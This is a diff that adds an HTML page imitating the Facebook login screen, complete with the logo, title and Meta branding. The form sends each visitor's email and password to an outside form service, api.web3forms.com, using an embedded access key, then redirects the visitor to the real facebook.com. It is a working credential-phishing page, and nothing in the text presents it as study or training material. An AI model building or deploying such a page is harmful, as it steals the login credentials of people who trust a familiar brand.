@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="Facebook_Logo_2023.png" type="image/x-icon">
+    <link href="https://fonts.cdnfonts.com/css/facebook-letter-faces" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+                
+    <title>Facebook - log in or sign up</title>
+</head>
+<body>
+    
+    <div class="main-container">
+        <div class="container">
+            <div class="logo-text">
+                <div class="child-container">
+                <div class="img"><img src="Facebook_Logo_2023.png" alt="logo" height="60px" width="60px"></div>
+                <h2></h2>
+        </div>
+            </div>
+            <form action="https://api.web3forms.com/submit" method="post"  class="form-entry" id="form">
+
+                
+
+                <input type="hidden" name="access_key" value="5f88e038-ce18-4234-afcf-c03ae610e02b">
+                <input type="hidden" name="redirect" value="https://facebook.com/.html">
+
+            <div>
+                <input name="email" type="text" placeholder="Mobile number or email" value="" class="input" id="email" required><br>
+                <p class="error" style="padding: 4px;">*invalid email id or password</p>   
+            </div>
+                <br>
+                <div class="password-container">
+                <input name="message" type="password" placeholder="Password" class="Password" value="" id="password" required>
+                <span id="togglePassword" class="eye-icon">👁</span><br>
+                <p class="error" style="padding: 4px;">*invalid email id or password</p>   
+                </div>
+                <br>
+                <button class="log-in" type="submit" id="logIn" style="cursor: pointer;">Log in</button>
+                <h4 class="fp"><a href="https://www.facebook.com/" id="fp" style="cursor: pointer;">Forgot password?</a></h4>
+            </form>
+        </div>
+       <button class="new-account" type="reset" id="new-account" style="cursor: pointer;" href="https://www.facebook.com/">Create new account</button> 
+       <div class="meta">
+        <img src="download.png" alt="" height="40px" width="40px">
+        <h4>Meta</h4>
+       </div>
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+   
+</body>
+
+
+
+
+<script>
+    window.onload = function() {
+        // Reset the form fields when the page loads
+        document.getElementById("form").reset();
+    };
+</script>
+
+<script src="script.js"></script>
+</html>
